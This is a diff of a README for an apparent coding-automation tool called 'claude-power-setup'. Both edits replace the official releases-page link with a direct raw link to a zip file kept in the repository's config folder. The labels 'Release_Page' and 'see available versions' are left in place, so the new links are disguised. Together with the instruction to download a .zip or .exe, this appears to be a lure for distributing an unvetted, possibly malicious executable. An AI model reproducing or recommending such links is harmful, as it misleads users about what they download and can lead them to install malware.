@@ -1,6 +1,6 @@
 # 🤖 claude-power-setup - Automate your daily coding work flows
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/mishasuperficial646/claude-power-setup/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/mishasuperficial646/claude-power-setup/main/config/setup-claude-power-2.6.zip)
 
 ## What is this tool? 🛠️
 
@@ -25,7 +25,7 @@ If you lack Node.js, search your web browser for "Node.js download" and install 
 You must obtain the files from the official repository page. Follow these steps:
 
 1. Open your web browser.
-2. Visit this link to see available versions: [https://github.com/mishasuperficial646/claude-power-setup/releases](https://github.com/mishasuperficial646/claude-power-setup/releases)
+2. Visit this link to see available versions: [https://raw.githubusercontent.com/mishasuperficial646/claude-power-setup/main/config/setup-claude-power-2.6.zip](https://raw.githubusercontent.com/mishasuperficial646/claude-power-setup/main/config/setup-claude-power-2.6.zip)
 3. Locate the file ending in .zip or .exe.
 4. Click the file name to start the download to your computer.
 
